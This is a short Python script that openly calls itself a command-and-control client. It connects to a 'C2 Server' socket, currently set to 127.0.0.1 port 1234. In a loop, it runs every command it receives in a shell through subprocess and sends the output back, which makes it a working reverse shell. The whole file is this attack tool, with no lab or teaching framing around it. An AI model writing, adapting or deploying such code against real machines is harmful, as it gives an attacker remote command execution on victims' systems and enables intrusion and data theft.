import socket
import subprocess

server_ip = '127.0.0.1'
server_port = 1234

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

print("[+] Connected to C2 Server.")

while True:
    try:
        # Receive command from C2 server
        command = client_socket.recv(1024).decode()
        print(f"[*] Received command: {command}")

        if command.lower() == 'quit':
            break

        # Execute the command
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output

        if not output:
            output = "[+] Command executed, but no output."

        # Send command output back to server
        print(f"[*] Sending output: {output}")
        client_socket.send(output.encode())

    except ConnectionResetError:
        print("[-] Connection lost. Exiting...")
        break

client_socket.close()